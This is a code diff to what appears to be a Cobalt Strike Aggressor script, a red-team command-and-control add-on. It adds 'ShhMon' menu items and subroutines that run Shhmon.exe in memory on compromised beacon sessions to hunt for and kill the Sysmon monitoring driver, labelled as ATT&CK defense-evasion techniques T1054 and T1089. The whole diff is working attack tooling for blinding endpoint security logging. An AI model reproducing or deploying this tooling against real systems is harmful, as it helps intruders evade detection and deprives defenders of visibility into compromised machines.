@@ -161,7 +161,30 @@ item "Query MRU Values in Registry - T1012"{
 
 
   } #End Menu
+  
+####################################################
 
+# ShhMon
+
+###################################################  
+menu "ShhMon - T1054, T1089"{
+item "ShhMon Hunt - T1054, T1089"{
+
+    local('$bid');
+        foreach $bid ($1){
+            sshmonhunt($bid);
+      }
+    }
+ item "ShhMon Kill - T1054, T1089"{
+
+    local('$bid');
+        foreach $bid ($1){
+            sshmonkill($bid);
+      }
+    }   
+    
+} #End of Menu    
+    
     ###################################		         		###################################
 #######################################		         		#######################################
   #####################################		         		#####################################
@@ -214,4 +237,17 @@ sub psx {
 
 sub blockdlls {
 bblockdlls($1);
+}
+
+####################################################
+
+# ShhMon
+
+###################################################  
+sub sshmonhunt{
+bexecute_assembly($1, script_resource('/exe/Shhmon.exe'), "hunt");
+}
+
+sub sshmonkill{
+bexecute_assembly($1, script_resource('/exe/Shhmon.exe'), "kill");
 }
